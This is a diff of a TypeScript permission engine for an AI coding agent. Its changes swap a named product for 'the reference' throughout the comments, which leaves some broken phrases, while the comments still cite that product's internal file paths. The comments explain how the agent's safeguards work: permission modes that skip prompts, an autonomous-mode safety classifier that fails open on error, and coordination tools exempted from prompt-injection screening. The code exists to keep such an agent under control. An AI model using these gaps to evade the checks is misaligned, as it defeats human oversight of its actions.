@@ -38,7 +38,7 @@ import type { PermissionContentBlock } from './permission-content-blocks';
 // ---------------------------------------------------------------------------
 
 // Each mode is a DISTINCT permission semantic (names mix AMI-native kebab and
-// Claude-Code wire-names — that is intentional, we match CC semantics, not a naming
+// the reference wire-names — that is intentional, we match CC semantics, not a naming
 // convention). `dontAsk` was removed: it was a semantic DUPLICATE of `deny-all` (both
 // deny every tool call); normalizePermissionMode maps the legacy spelling to deny-all.
 export const PERMISSION_MODES = ['ask', 'auto', 'auto-allow', 'deny-all', 'acceptEdits', 'bypassPermissions', 'plan'] as const;
@@ -47,7 +47,7 @@ export type PermissionMode = (typeof PERMISSION_MODES)[number];
 /**
  * Zod enum over the canonical {@link PERMISSION_MODES}. The single VALIDATION
  * primitive for a permission-mode string, reusable anywhere a settings/config
- * schema needs to parse one (mirrors Claude Code's `permissionModeSchema`). It
+ * schema needs to parse one (mirrors the reference's `permissionModeSchema`). It
  * is discovery-driven — it derives from the `PERMISSION_MODES` tuple, so a new
  * canonical mode is accepted the moment it is added there (no second list to
  * keep in sync). {@link normalizePermissionMode} parses the canonical arm through
@@ -64,8 +64,8 @@ export const permissionModeSchema = z.enum(PERMISSION_MODES);
  * mode means and never maps anything to a MORE-permissive default (unknown stays
  * `null`). Keys are matched exactly first, then case-insensitively.
  *
- * Parity note: Claude Code's interactive default mode is named `default`; AMI
- * names that same semantic `ask`. A Claude settings.json (`"defaultMode":
+ * Parity note: the reference's interactive default mode is named `default`; AMI
+ * names that same semantic `ask`. A the reference settings.json (`"defaultMode":
  * "default"`) or `--permission-mode default` must therefore resolve to `ask`
  * rather than be rejected. The kebab/camel/lowercase variants let a rule file
  * authored against either naming convention load without a spelling mismatch
@@ -74,7 +74,7 @@ export const permissionModeSchema = z.enum(PERMISSION_MODES);
 export const PERMISSION_MODE_ALIASES: Record<string, PermissionMode> = {
   // Legacy removed duplicate (both denied every tool call) — kept for back-compat.
   dontAsk: 'deny-all',
-  // Claude Code's canonical name for the interactive default.
+  // the reference's canonical name for the interactive default.
   default: 'ask',
   normal: 'ask',
   interactive: 'ask',
@@ -94,7 +94,7 @@ export const PERMISSION_MODE_ALIASES: Record<string, PermissionMode> = {
  * valid set IS {@link PERMISSION_MODES}, so a new mode is accepted everywhere the moment
  * it is added to the const — no hardcoded subset can drift, cf. ui#19). Returns the
  * canonical mode, resolves a non-canonical spelling via {@link PERMISSION_MODE_ALIASES}
- * (exact match first, then case-insensitively — e.g. `default` → `ask`, the Claude Code
+ * (exact match first, then case-insensitively — e.g. `default` → `ask`, the reference
  * wire name), or null if unknown. Every consumer (CLI `--permission-mode`, project
  * config, `/permissions <mode>`) MUST validate through this rather than an inline list.
  */
@@ -111,7 +111,7 @@ export function normalizePermissionMode(raw: string): PermissionMode | null {
 
 /**
  * The ordered set of permission modes a user cycles through interactively (the
- * Claude Code shift-tab cycle: default → accept-edits → plan → default). The
+ * the reference shift-tab cycle: default → accept-edits → plan → default). The
  * blanket modes (`deny-all`, `auto-allow`, `bypassPermissions`) are deliberately
  * EXCLUDED so an accidental keypress can never silently drop into a mode that
  * allows or denies everything — those are reachable only via an explicit flag.
@@ -120,7 +120,7 @@ export const PERMISSION_MODE_CYCLE: readonly PermissionMode[] = ['ask', 'acceptE
 
 /**
  * Advance the permission mode one step around {@link PERMISSION_MODE_CYCLE}
- * (parity with Claude Code's shift-tab mode toggle). `forward` mirrors shift-tab,
+ * (parity with the reference's shift-tab mode toggle). `forward` mirrors shift-tab,
  * `backward` the reverse. If `current` is a flag-only blanket mode outside the
  * cycle, re-enter at the safe interactive default (`forward`) or the last cycle
  * entry (`backward`) — a user-initiated cycle never auto-widens a blanket deny
@@ -144,7 +144,7 @@ export function cyclePermissionMode(
  * — OR is unset (`undefined`). Centralizes the "is this the default?" branch so the
  * undefined-vs-default equivalence lives in ONE place instead of being re-derived as
  * scattered `?? 'ask'` coalescing at each call site (which invites drift when the
- * default changes). Mirrors Claude's `isDefaultMode` (utils/permissions/PermissionMode.ts),
+ * default changes). Mirrors the reference's `isDefaultMode` (utils/permissions/PermissionMode.ts),
  * which likewise treats both the default string and `undefined` as the default.
  */
 export function isDefaultMode(mode: PermissionMode | undefined): boolean {
@@ -158,7 +158,7 @@ export function isDefaultMode(mode: PermissionMode | undefined): boolean {
  * mode?" predicate so the transition-time rule-cleanup in {@link PermissionManager}
  * and any UI that warns on escalation share ONE definition. The screened-autonomy
  * `auto` mode is NOT included: it still risk-screens every call, so it is not a
- * blanket relaxation. Mirrors Claude's set of modes that trigger
+ * blanket relaxation. Mirrors the reference's set of modes that trigger
  * `transitionPermissionMode` cleanup (getNextPermissionMode.ts).
  */
 export function isPermissivePermissionMode(mode: PermissionMode | undefined): boolean {
@@ -182,7 +182,7 @@ export function isPermissivePermissionMode(mode: PermissionMode | undefined): bo
  * The `acceptEdits` placement is the parity-critical case. `acceptEdits`
  * auto-accepts edits WITHIN the cwd (via the edit-tool fast-path in {@link
  * PermissionManager.check}), but an edit/read whose path lands OUTSIDE the cwd is
- * CLASSIFIED, not blanket-granted — mirroring Claude Code's acceptEdits scoping
+ * CLASSIFIED, not blanket-granted — mirroring the reference's acceptEdits scoping
  * ("allowed in CWD, classified outside CWD"; classifierDecision.ts safe-set doc +
  * modeValidation CWD fast-path). This is the SINGLE source of truth for the
  * out-of-workspace disposition so the executor's path-boundary guard can never
@@ -201,7 +201,7 @@ export function outOfWorkspacePathDisposition(mode: PermissionMode | undefined):
  * The reduced permission-mode vocabulary exposed to EXTERNAL / SDK consumers. A
  * superset consumer should not have to understand AMI's richer internal set
  * (`auto-allow`, `deny-all`); those collapse onto an external equivalent via
- * {@link toExternalPermissionMode}. Mirrors Claude's `EXTERNAL_PERMISSION_MODES`
+ * {@link toExternalPermissionMode}. Mirrors the reference's `EXTERNAL_PERMISSION_MODES`
  * (the internal set minus vendor-only modes), with AMI's neutral mode surfaced as
  * the canonical `default` label.
  */
@@ -209,7 +209,7 @@ export const EXTERNAL_PERMISSION_MODES = ['default', 'acceptEdits', 'bypassPermi
 export type ExternalPermissionMode = (typeof EXTERNAL_PERMISSION_MODES)[number];
 
 /** Zod enum over {@link EXTERNAL_PERMISSION_MODES} — the validation primitive for
- *  the reduced external/SDK mode vocabulary (parity: Claude's
+ *  the reduced external/SDK mode vocabulary (parity: the reference's
  *  `externalPermissionModeSchema`). Backs {@link isExternalPermissionMode} so the
  *  guard and any external-config schema share one source of truth. */
 export const externalPermissionModeSchema = z.enum(EXTERNAL_PERMISSION_MODES);
@@ -226,7 +226,7 @@ export function isExternalPermissionMode(mode: string): mode is ExternalPermissi
 
 /**
  * Collapse an INTERNAL {@link PermissionMode} onto the {@link ExternalPermissionMode}
- * surfaced to external/SDK consumers (parity: Claude's `toExternalPermissionMode`).
+ * surfaced to external/SDK consumers (parity: the reference's `toExternalPermissionMode`).
  * `ask`/`undefined` → `default` (the neutral mode); the three shared modes pass
  * through unchanged; the remaining internal-only modes map to their closest external
  * equivalent — a blanket `auto-allow` reads as `bypassPermissions` (both skip the
@@ -247,7 +247,7 @@ export function toExternalPermissionMode(mode: PermissionMode | undefined): Exte
  * Carries both the raw internal modes and their externalized forms so a listener can
  * audit the security-critical transition (e.g. into `bypassPermissions`/`auto-allow`)
  * without re-deriving the external label. `reason` names the mutation path that
- * triggered it. Parity: Claude's `notifyPermissionModeChanged` single-choke-point
+ * triggered it. Parity: the reference's `notifyPermissionModeChanged` single-choke-point
  * notification (state/onChangeAppState.ts, utils/sessionState.ts) — every path that
  * changes the mode fires this, so no path can silently escalate privileges.
  */
@@ -270,7 +270,7 @@ export type PermissionModeChangeListener = (change: PermissionModeChange) => voi
 
 /**
  * Where a permission rule/update is persisted, in precedence order (later wins at
- * runtime; earlier is broader scope). Mirrors Claude's PermissionUpdateDestination:
+ * runtime; earlier is broader scope). Mirrors the reference's PermissionUpdateDestination:
  * - `userSettings`   — global (~/.ami), applies everywhere;
  * - `projectSettings`— shared per-project, committed (cwd/.ami);
  * - `localSettings`  — per-project but gitignored (cwd/.ami, *.local.json);
@@ -289,7 +289,7 @@ export type PermissionUpdateDestination = (typeof PERMISSION_UPDATE_DESTINATIONS
  *  - `policySettings` — managed/enterprise rules (admin-owned, highest precedence);
  *  - `flagSettings`   — rules injected from a settings file named by a launch flag;
  *  - `command`        — rules contributed at runtime by a slash command / tool.
- * Mirrors Claude's `PermissionRuleSource` (types/permissions.ts L54-63), which is
+ * Mirrors the reference's `PermissionRuleSource` (types/permissions.ts L54-63), which is
  * deliberately wider than its writable `PermissionUpdateDestination` set.
  */
 export const PERMISSION_RULE_SOURCES = [
@@ -323,7 +323,7 @@ export function isManagedPermissionSource(source: PermissionRuleSource | undefin
  * (enterprise-managed), and `command` (slash-command frontmatter). Personal tiers
  * (`userSettings`, `localSettings`, `cliArg`, `session`, `flagSettings`) only
  * affect the current user. An undefined source is treated as personal (the safe
- * default — it is never attributed to the team). Mirrors Claude's
+ * default — it is never attributed to the team). Mirrors the reference's
  * `isSharedSettingSource` (utils/permissions/shadowedRuleDetection.ts L61-67); it
  * gates whether the sandbox-auto-allow shadow carve-out applies (a personal ask
  * rule a user's own sandbox would auto-allow is NOT reported as shadowing, but a
@@ -336,7 +336,7 @@ export function isSharedSettingSource(source: PermissionRuleSource | undefined):
 /** Human-readable prose for each {@link PermissionRuleSource}, for naming WHERE a
  *  rule came from in `/permissions` shadow warnings, `/doctor` findings, and fix
  *  suggestions (an opaque token like `localSettings` is unreadable). Mirrors
- *  Claude's `permissionRuleSourceDisplayString`. */
+ *  the reference's `permissionRuleSourceDisplayString`. */
 const PERMISSION_RULE_SOURCE_DISPLAY: Record<PermissionRuleSource, string> = {
   userSettings: 'user settings',
   projectSettings: 'project settings',
@@ -369,7 +369,7 @@ export interface PermissionRule {
  * Plain-language, one-line preview of what a {@link PermissionRule} does, for
  * showing the user — under a pattern input while they type, and in the "Rule
  * added" confirmation — what they are about to grant/deny BEFORE it takes effect.
- * Parity: Claude's `PermissionRuleDescription`. Reads behavior + tool + scope +
+ * Parity: the reference's `PermissionRuleDescription`. Reads behavior + tool + scope +
  * (optionally) origin tier, e.g.:
  *   `Allow bash commands matching "git status"`
  *   `Deny edits to files matching "/etc/**" (from enterprise managed settings)`
@@ -406,7 +406,7 @@ export function describeRule(rule: PermissionRule): string {
  * pattern-less rule against every command, as does an empty or `*` pattern, and a
  * `*`-tool allow spans bash too. A param-scoped rule is NOT broad (it still
  * constrains the input), nor is any deny / non-bash-and-non-`*` rule. Mirrors
- * Claude's `isOverlyBroadBashAllowRule` (utils/permissions/permissionSetup.ts
+ * the reference's `isOverlyBroadBashAllowRule` (utils/permissions/permissionSetup.ts
  * L349-355 — `Bash`, `Bash(*)`, `Bash()` all parse to a Bash allow with no
  * ruleContent). Interpreter-prefix forms (`python:*`, `node*`) are a SEPARATE,
  * broader hazard class handled by the cli detector on top of this predicate.
@@ -423,7 +423,7 @@ export function isOverlyBroadBashAllowRule(rule: PermissionRule): boolean {
 /**
  * Structured description of an active permission rule that is effectively
  * equivalent to YOLO / bypass-permissions, for a UI/`/doctor` warning. Mirrors
- * Claude's `DangerousPermissionInfo` (utils/permissions/permissionSetup.ts): a
+ * the reference's `DangerousPermissionInfo` (utils/permissions/permissionSetup.ts): a
  * display string for the rule and a human-readable string for where it came from,
  * so the warning can say exactly which rule from which source grants full
  * autonomy. `ruleValue`/`source` are kept for callers that want to remediate
@@ -456,7 +456,7 @@ function isOverlyBroadBashAllowRuleValue(value: PermissionRuleValue): boolean {
  * Scan loaded `allow` rules AND raw CLI `--allow` tool specs for overly-broad bash
  * grants (the YOLO / bypass-permissions equivalent) and return a structured
  * {@link DangerousPermissionInfo} per hit, so a UI / `/permissions` surface can
- * warn the user that a rule silently grants full shell autonomy. Mirrors Claude's
+ * warn the user that a rule silently grants full shell autonomy. Mirrors the reference's
  * `findOverlyBroadBashPermissions` (utils/permissions/permissionSetup.ts
  * L376-412): it checks both persisted rules and the ephemeral `--allow` flag list,
  * tagging the latter with the `cliArg` source and `--allow` display. Uses the
@@ -498,7 +498,7 @@ export function findOverlyBroadBashPermissions(
  *    more severe case.
  *  - `ask`  — the allow is never reached because a preceding tool-wide ask always
  *    prompts first (it still "fires", just never silently allows).
- * Mirrors Claude's `ShadowType` (utils/permissions/shadowedRuleDetection.ts).
+ * Mirrors the reference's `ShadowType` (utils/permissions/shadowedRuleDetection.ts).
  */
 export type ShadowType = 'deny' | 'ask';
 
@@ -506,7 +506,7 @@ export type ShadowType = 'deny' | 'ask';
  * A permission rule that can never fire because a higher-priority rule shadows it,
  * with a human-readable {@link reason} naming the shadowing rule + its source and a
  * concrete {@link fix} telling the user which rule to remove to make it reachable.
- * Returned by {@link PermissionManager.detectShadowedRules}. Mirrors Claude's
+ * Returned by {@link PermissionManager.detectShadowedRules}. Mirrors the reference's
  * `UnreachableRule`.
  */
 export interface UnreachableRule {
@@ -527,7 +527,7 @@ export interface UnreachableRule {
  * `sandboxAutoAllowEnabled` is true, a tool-wide Bash *ask* rule from PERSONAL
  * settings is NOT reported as shadowing a specific Bash allow — sandboxed commands
  * are auto-allowed so the ask never actually gates them for this user (shared-source
- * ask rules still warn, since teammates may lack the sandbox). Mirrors Claude's
+ * ask rules still warn, since teammates may lack the sandbox). Mirrors the reference's
  * `DetectUnreachableRulesOptions`. Omitted → derived from the manager's own sandbox
  * policy.
  */
@@ -539,7 +539,7 @@ export interface DetectUnreachableRulesOptions {
  * Resolve the on-disk file a permission destination maps to, or null for the
  * in-memory tiers (`session`, `cliArg`). `userSettings` is global (~/.ami);
  * `projectSettings`/`localSettings` are per-project under `cwd/.ami` (local is
- * the gitignored `.local.json` variant). Mirrors Claude's per-destination
+ * the gitignored `.local.json` variant). Mirrors the reference's per-destination
  * settings-file resolution.
  */
 export function permissionDestinationPath(
@@ -565,7 +565,7 @@ export function permissionDestinationPath(
  * `/etc/superinference/config.json`) as `permissions.json`, so one admin-owned
  * location holds both managed config and managed permission policy. Admin-owned and
  * read-only to the agent: these rules can be loaded/evaluated but never persisted to.
- * Mirrors Claude's `policySettings` managed-settings tier.
+ * Mirrors the reference's `policySettings` managed-settings tier.
  */
 export function managedPermissionsPath(): string {
   return path.join(path.dirname(getManagedConfigPath()), 'permissions.json');
@@ -603,7 +603,7 @@ export interface AutoModeSafetyVerdict {
    * defer to the deterministic decision"), the first-class spelling of what a
    * classifier previously could only express by returning `undefined`. It lets a
    * composable/layered classifier decline to weigh in without being read as a
-   * positive `allow`. Mirrors Claude Code's `PermissionResult.behavior:
+   * positive `allow`. Mirrors the reference's `PermissionResult.behavior:
    * 'passthrough'` and consolidates with the {@link PermissionVerdict} /
    * {@link HookVerdict} `passthrough` abstain vocabulary (one canonical word for
    * "defer" across the engine). Treated identically to `allow`/`undefined` by
@@ -620,13 +620,13 @@ export interface AutoModeSafetyVerdict {
  * on the AUTONOMOUS auto-approve path (`auto-allow` / `bypassPermissions` / inherited
  * plan-bypass / screened `auto`) BEFORE a tool call is silently allowed. It can
  * DOWNGRADE an auto-approval to a prompt (`ask`) or a block (`deny`) with a recorded
- * reason — it can never UPGRADE an `ask`/`deny` to `allow`. Mirrors Claude Code's
+ * reason — it can never UPGRADE an `ask`/`deny` to `allow`. Mirrors the reference's
  * transcript/"auto-mode" safety classifier (`classifierApprovals.ts` /
  * `useCanUseTool` yolo classifier): a model- or rule-backed check that gates
  * autonomous approvals. The deterministic engine is the floor; this seam only ever
  * TIGHTENS it. Returning `undefined`, resolving to `allow`, or throwing all FAIL OPEN
  * to the deterministic auto-approval (the static classifier remains authoritative),
- * matching Claude's "classifier error → fall back to the static decision" behavior.
+ * matching the reference's "classifier error → fall back to the static decision" behavior.
  * The common/engine layer injects a concrete classifier via
  * {@link PermissionManager.setAutoModeSafetyClassifier}; unset → the seam is inert and
  * autonomous behavior is byte-for-byte unchanged.
@@ -645,15 +645,15 @@ export interface PermissionPromptResult {
    * {@link permissionGrantTier} for the single canonical classifier the executor
    * and UI share instead of re-deriving the tier inline:
    *   - `allow_once`    — approve THIS call only; no standing rule is created, the
-   *                       next matching call prompts again (Claude's user_temporary).
+   *                       next matching call prompts again (the reference's user_temporary).
    *   - `allow_session` — a standing allow rule for the REST OF THIS SESSION only:
    *                       kept in memory and NEVER written to disk, even when an
    *                       on-disk persist destination is configured. The "scoped
    *                       session accept" that is explicitly distinct from a
-   *                       persisted "allow always" (Claude's `accept-session`).
+   *                       persisted "allow always" (the reference's `accept-session`).
    *   - `allow_pattern` — a standing allow rule the user means to KEEP: persisted to
    *                       the configured on-disk settings tier when one is set
-   *                       (Claude's persisted "don't ask again" / user_permanent).
+   *                       (the reference's persisted "don't ask again" / user_permanent).
    *   - `deny` / `cancelled` — refuse / abandon (not a grant).
    */
   action: 'allow_once' | 'allow_pattern' | 'allow_session' | 'deny' | 'cancelled';
@@ -676,7 +676,7 @@ export interface PermissionPromptResult {
    * when the decision is an allow. Honored only on `allow_once` / `allow_pattern`;
    * ignored on deny/cancelled. The executor validates it against the tool schema
    * (dropping undeclared keys) before substituting it, so the UI cannot smuggle
-   * unknown parameters. Mirrors Claude's `onAllow(updatedInput)` /
+   * unknown parameters. Mirrors the reference's `onAllow(updatedInput)` /
    * `ideDiffSupport.applyChanges` (the permission dialog returns the user's
    * modified edits instead of a plain allow).
    */
@@ -690,7 +690,7 @@ export interface PermissionPromptResult {
    * document blocks are surfaced as a short naming note. Carried on both approve
    * (`allow_once`/`allow_pattern`) and refuse (`deny`/`cancelled`) decisions so the
    * model never receives ONLY a plain-text line when richer context was provided.
-   * Split into delivery channels by `splitPermissionContentBlocks`. Mirrors Claude's
+   * Split into delivery channels by `splitPermissionContentBlocks`. Mirrors the reference's
    * `PermissionDecision.contentBlocks` (PermissionContext `buildAllow` /
    * `cancelAndAbort` / `handleUserAllow`), using AMI's own content-block union.
    */
@@ -708,7 +708,7 @@ export interface PermissionPromptResult {
  *   - `'always'`    — a standing rule the user means to keep; persisted to the
  *                     configured on-disk settings tier when one is set.
  *   - `'deny'` / `'cancelled'` — not a grant.
- * Mirrors Claude Code's accept-session vs persisted "don't ask again" distinction
+ * Mirrors the reference's accept-session vs persisted "don't ask again" distinction
  * (FilePermissionDialog `accept-session` vs the persisted rule). Pure.
  *
  * REGRESSION LOCK: if `allow_session` ever maps to `'always'` (or `allow_pattern`
@@ -761,7 +761,7 @@ export interface PermissionPromptHandler {
 /**
  * Structured reason a permission decision needs confirmation/was denied. The
  * `type` discriminator lets the UI explain WHY approval is required instead of a
- * bare "needs approval". Mirrors Claude's permissionResult.decisionReason union.
+ * bare "needs approval". Mirrors the reference's permissionResult.decisionReason union.
  */
 export type PermissionDecisionReason =
   | { type: 'hardline'; description: string }
@@ -778,7 +778,7 @@ export type PermissionDecisionReason =
        * provenance used to decide whether a remediation hint applies — a rule from the
        * enterprise-managed `policySettings` tier is admin-owned and cannot be changed by
        * the user, so the "update your rules" hint is suppressed for it (parity with
-       * Claude's `decisionReason.rule.source === 'policySettings'` branch in
+       * the reference's `decisionReason.rule.source === 'policySettings'` branch in
        * PermissionRuleExplanation.tsx).
        */
       ruleSource?: PermissionRuleSource;
@@ -788,22 +788,22 @@ export type PermissionDecisionReason =
   | { type: 'classifier'; name?: string; reason?: string }
   /**
    * The action targets a path OUTSIDE the agent's workspace (launch cwd + granted
-   * read roots), so it needs explicit consent. Mirrors Claude's `workingDir`
+   * read roots), so it needs explicit consent. Mirrors the reference's `workingDir`
    * decisionReason. `path` is the offending target; `reason` is the human sentence.
    */
   | { type: 'workingDir'; path: string; reason: string }
   /**
    * A hook (PreToolUse / PermissionRequest) asked for or denied confirmation.
-   * Mirrors Claude's `hook` decisionReason (hookName + optional reason + source tag).
+   * Mirrors the reference's `hook` decisionReason (hookName + optional reason + source tag).
    * `behavior` is the decision the hook actually returned (allow/deny/ask) when it
    * made one, so the message can read "<hook> allowed/denied/asked for confirmation
-   * for this action" (parity with Claude's toolHooks `getRuleBehaviorDescription`
+   * for this action" (parity with the reference's toolHooks `getRuleBehaviorDescription`
    * phrasing) instead of the generic "requires approval".
    */
   | { type: 'hook'; hookName: string; reason?: string; hookSource?: string; behavior?: 'allow' | 'deny' | 'ask' }
   /**
    * The call opted out of the sandbox (`dangerouslyDisableSandbox`), so it must be
-   * explicitly authorized to run unsandboxed. Mirrors Claude's `sandboxOverride`
+   * explicitly authorized to run unsandboxed. Mirrors the reference's `sandboxOverride`
    * decisionReason ("Requires permission to bypass sandbox").
    */
   | { type: 'sandboxOverride' }
@@ -818,7 +818,7 @@ export type SafetyCheckKind = (typeof SAFETY_CHECK_KINDS)[number];
  * Map a permission BEHAVIOR enum (`allow`/`deny`/`ask`) to its grammatical past-tense
  * prose, so a decision can be narrated in a sentence — "<hook> allowed this action",
  * "<rule> denied this action", "<hook> asked for confirmation for this action".
- * Mirrors Claude's `getRuleBehaviorDescription` (utils/permissions/PermissionResult.ts),
+ * Mirrors the reference's `getRuleBehaviorDescription` (utils/permissions/PermissionResult.ts),
  * where `ask` (the default) reads "asked for confirmation for". A single canonical
  * mapping so callers never hand-roll the allow→"allowed" / deny→"denied" conversion.
  *
@@ -826,7 +826,7 @@ export type SafetyCheckKind = (typeof SAFETY_CHECK_KINDS)[number];
  * any value outside `allow`/`deny` — including a future/unknown behavior a newer
  * settings file might carry — degrades to the most conservative "asked for
  * confirmation for" prose rather than throwing or mislabeling it as an allow (parity
- * with Claude's `getRuleBehaviorDescription` `default` arm).
+ * with the reference's `getRuleBehaviorDescription` `default` arm).
  */
 export function getRuleBehaviorDescription(behavior: string): string {
   switch (behavior) {
@@ -840,7 +840,7 @@ export function getRuleBehaviorDescription(behavior: string): string {
 }
 
 /**
- * The CATEGORY of a tool for permission-prompt phrasing, mirroring Claude's
+ * The CATEGORY of a tool for permission-prompt phrasing, mirroring the reference's
  * PermissionRuleExplanation `toolType` (`'tool' | 'command' | 'edit' | 'read'`):
  * it shapes the NOUN in a confirmation/denial message ("…for this command" vs
  * "…for this edit"/"…for this read") so the prompt reads naturally for the tool
@@ -856,7 +856,7 @@ export type PermissionPromptToolType = 'command' | 'edit' | 'read' | 'tool';
  * wording. Reuses the permission engine's own read/mutating tool-name sets (no
  * parallel list, cf. No-Duplication Rule): bash → `'command'`, an editing/writing
  * tool → `'edit'`, a read-only tool → `'read'`, anything else → a generic
- * `'tool'`. Mirrors Claude's per-category phrasing in PermissionRuleExplanation.
+ * `'tool'`. Mirrors the reference's per-category phrasing in PermissionRuleExplanation.
  */
 export function permissionPromptToolType(toolName: string): PermissionPromptToolType {
   const tool = normalizeToolName(toolName);
@@ -876,7 +876,7 @@ function permissionPromptToolNoun(toolType: PermissionPromptToolType): string {
  * Build a human-readable explanation from a structured decision reason. When a
  * {@link PermissionPromptToolType} is supplied, the generic noun is phrased per
  * tool category ("for this edit" / "for this read" / "for this tool call") —
- * parity with Claude's PermissionRuleExplanation, which interpolates the tool
+ * parity with the reference's PermissionRuleExplanation, which interpolates the tool
  * category into every message. Omitting it preserves the default "command"
  * (rule) / "action" (mode/hook/other) wording for callers that have no tool
  * context.
@@ -923,7 +923,7 @@ export const RISK_LEVELS = ['LOW', 'MEDIUM', 'HIGH'] as const;
 export type RiskLevel = (typeof RISK_LEVELS)[number];
 
 /** Numeric severity of a {@link RiskLevel} (LOW=1, MEDIUM=2, HIGH=3), for ordering
- *  and analytics bucketing. Parity: Claude's `RISK_LEVEL_NUMERIC` map. */
+ *  and analytics bucketing. Parity: the reference's `RISK_LEVEL_NUMERIC` map. */
 export function riskLevelRank(level: RiskLevel): number {
   return RISK_LEVELS.indexOf(level) + 1;
 }
@@ -931,8 +931,8 @@ export function riskLevelRank(level: RiskLevel): number {
 /**
  * A plain-language risk assessment of a pending tool call, surfaced on the
  * permission prompt so the user can make an informed allow/deny decision and
- * attached to denial records for later review. Parity: Claude's
- * `PermissionExplanation` (utils/permissions/permissionExplainer.ts). Claude
+ * attached to denial records for later review. Parity: the reference's
+ * `PermissionExplanation` (utils/permissions/permissionExplainer.ts). the reference
  * generates this with an LLM side-query; AMI computes it DETERMINISTICALLY from the
  * same command-classification primitives the permission engine already uses
  * ({@link PermissionManager.classifyBashCommand}, {@link detectHardlineCommand}),
@@ -1068,13 +1068,13 @@ export function classifyPermissionRisk(toolName: string, input: unknown): Permis
 }
 
 // ---------------------------------------------------------------------------
-// 'auto' permission mode — screened autonomy (parity: Claude Code's AutoMode)
+// 'auto' permission mode — screened autonomy (parity: the reference's AutoMode)
 // ---------------------------------------------------------------------------
 
 /**
  * The verdict of the per-call screen the `auto` permission mode applies to EVERY
  * tool call: `allow` runs it without a prompt, `deny` blocks it (the engine
- * reports the block to the model, which may try a different approach — Claude's
+ * reports the block to the model, which may try a different approach — the reference's
  * "block what is judged risky" fallback). This is a middle ground between `ask`
  * (prompt on everything) and `auto-allow` (run everything except hardline): an
  * autonomous run proceeds without prompts yet is bounded by a per-call risk +
@@ -1101,7 +1101,7 @@ export interface AutoModeScreen {
  * actively harmful: a `send_message`/`task` payload legitimately carries free-form
  * task text that can trip the prompt-injection heuristic ({@link detectPromptInjection}),
  * which would stall autonomous swarm coordination that is in fact safe. Mirrors
- * Claude Code's `SAFE_YOLO_ALLOWLISTED_TOOLS` (classifierDecision.ts) and its
+ * the reference's `SAFE_YOLO_ALLOWLISTED_TOOLS` (classifierDecision.ts) and its
  * documented rationale that spawned subagents/teammates carry their own per-call
  * permission checks. Names are AMI-canonical (post {@link normalizeToolName}), so a
  * legacy/aliased spelling (`Task` → `task`) is covered too.
@@ -1117,7 +1117,7 @@ export const AUTO_MODE_SAFE_TOOLS: ReadonlySet<string> = new Set([
 /**
  * True when `toolName` is a coordination/orchestration tool the `auto` mode screen
  * may allow without re-judging ({@link AUTO_MODE_SAFE_TOOLS}). The name is
- * canonicalized first so a legacy/cross-framework spelling (e.g. Claude's `Task`)
+ * canonicalized first so a legacy/cross-framework spelling (e.g. the reference's `Task`)
  * is recognized as AMI's `task`.
  */
 export function isAutoModeSafeTool(toolName: string): boolean {
@@ -1148,7 +1148,7 @@ function collectToolInputText(input: unknown): string {
  * LOW (read-only) and MEDIUM (recoverable mutation) calls run without a prompt.
  * Pure and side-effect free; reuses the existing classifiers so the screen can
  * never drift from the permission engine's own risk model (No-Duplication Rule).
- * Parity: Claude Code's auto mode (per-call risk + prompt-injection gate with a
+ * Parity: the reference's auto mode (per-call risk + prompt-injection gate with a
  * block-and-retry fallback, AutoModeOptInDialog.tsx).
  */
 export function screenAutoModeToolCall(toolName: string, input: unknown): AutoModeScreen {
@@ -1156,7 +1156,7 @@ export function screenAutoModeToolCall(toolName: string, input: unknown): AutoMo
   // subagents/teammates/workflows, each of which is INDEPENDENTLY permission-checked
   // when it runs, so re-judging the coordinator is redundant — and the free-form task
   // text these calls carry would otherwise trip the injection/risk heuristics and
-  // stall safe autonomous coordination. Parity: Claude's SAFE_YOLO_ALLOWLISTED_TOOLS.
+  // stall safe autonomous coordination. Parity: the reference's SAFE_YOLO_ALLOWLISTED_TOOLS.
   if (isAutoModeSafeTool(toolName)) {
     return {
       decision: 'allow',
@@ -1206,7 +1206,7 @@ export interface RecentDenial {
    * When `source === 'classifier'`, WHICH classifier produced it — `'bash'` for the
    * deterministic bash command classifier, `'auto-mode'` for the injected autonomous
    * safety classifier. Lets `/permissions` show HOW a call was gated (parity with
-   * Claude's `ClassifierApproval.classifier` discriminant). Absent for non-classifier
+   * the reference's `ClassifierApproval.classifier` discriminant). Absent for non-classifier
    * sources.
    */
   classifier?: 'bash' | 'auto-mode';
@@ -1233,7 +1233,7 @@ export interface PermissionVerdict {
    * pinning the result to `allow`. It is the identity element of the
    * {@link mostRestrictiveVerdict} lattice — a `passthrough` never overrides a
    * real verdict and is always overridden by one, so a chain of evaluators can
-   * abstain until one of them actually decides. Mirrors Claude Code's
+   * abstain until one of them actually decides. Mirrors the reference's
    * `PermissionResult.behavior: 'passthrough'` (types/permissions.ts) and
    * consolidates with the {@link HookVerdict} `passthrough` state in
    * `hook-protection.ts` (one canonical abstain vocabulary across the engine).
@@ -1246,7 +1246,7 @@ export interface PermissionVerdict {
    * Which classifier produced this verdict, when it came from one (vs a static
    * rule): `'bash'` for the deterministic bash command classifier, `'auto-mode'`
    * for the injected autonomous-safety classifier. Lets a UI explain HOW a tool
-   * use was gated/approved — parity with Claude's `ClassifierApproval.classifier`
+   * use was gated/approved — parity with the reference's `ClassifierApproval.classifier`
    * discriminant (utils/classifierApprovals.ts). Absent for static-rule verdicts.
    */
   classifier?: 'bash' | 'auto-mode';
@@ -1289,7 +1289,7 @@ export function holdsOver(held: PermissionVerdict, answer: PermissionVerdict): b
  * evaluators can defer until one actually decides. When EVERY evaluator abstains
  * (all `passthrough`) the result is itself `passthrough` — "no layer had an
  * opinion", which the caller resolves against its own default (parity with
- * Claude's passthrough falling through to the normal permission flow). An empty
+ * the reference's passthrough falling through to the normal permission flow). An empty
  * chain is treated as abstain for the same reason.
  */
 export function mostRestrictiveVerdict(verdicts: PermissionVerdict[]): PermissionVerdict {
@@ -1337,16 +1337,16 @@ const SAFE_COMMANDS = new Set([
   'seq', 'expr', 'printf', 'comm', 'cmp', 'numfmt', 'getconf', 'tsort', 'pr', 'fmt',
   // Encoding / checksum read-only utilities (flag-validated). base64 only decodes/
   // encodes to stdout; the *sum commands only read files to compute/verify a hash.
-  // Mirrors Claude's base64 / sha256sum / sha1sum / md5sum read-only configs.
+  // Mirrors the reference's base64 / sha256sum / sha1sum / md5sum read-only configs.
   'base64', 'sha256sum', 'sha1sum', 'md5sum',
-  // Read-only type checker (flag-validated, --watch blocked). Mirrors Claude's
+  // Read-only type checker (flag-validated, --watch blocked). Mirrors the reference's
